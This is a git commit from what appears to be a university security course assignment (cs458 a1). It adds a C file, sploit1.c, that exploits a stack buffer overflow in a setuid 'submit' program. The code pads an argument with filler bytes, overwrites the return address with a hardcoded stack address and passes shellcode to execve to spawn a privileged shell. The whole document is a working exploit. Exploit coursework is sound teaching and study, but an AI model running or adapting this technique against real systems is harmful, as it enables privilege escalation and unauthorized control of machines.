9c5cad6e82bd0bf0ceea2380c8edc8aa28e2eadd
Kevin James <KevinJames@thekev.in>
2016-05-20 15:04:48 -0400

    add cs458 a1 sploit1

---
+++ assignments/cs458/a1/sploit1.c
@@ -0,0 +1,32 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include "shellcode.h"
+
+#define COMMAND "/usr/local/bin/submit"
+
+int main(void) {
+  char *args[4], *env[1];
+  int i, load_size;
+
+  load_size = 210 + 1 - strlen("Syntax:\n\t") + 4 + 1;
+
+  args[0] = (char *) malloc(load_size + strlen(shellcode) + 1);
+  for (i = 0; i < load_size; ++i) {
+    sprintf(args[0] + i, "%c", 'x');
+  }
+  sprintf(args[0] + i++, "%c", 0xb8);
+  sprintf(args[0] + i++, "%c", 0xdf);
+  sprintf(args[0] + i++, "%c", 0xbf);
+  sprintf(args[0] + i++, "%c", 0xff);
+
+  args[1] = "-h";
+  args[2] = shellcode;  // shellcode at 0xffbfdfb8
+  args[3] = NULL;
+
+  env[0] = NULL;
+
+  return execve(COMMAND, args, env);
+}
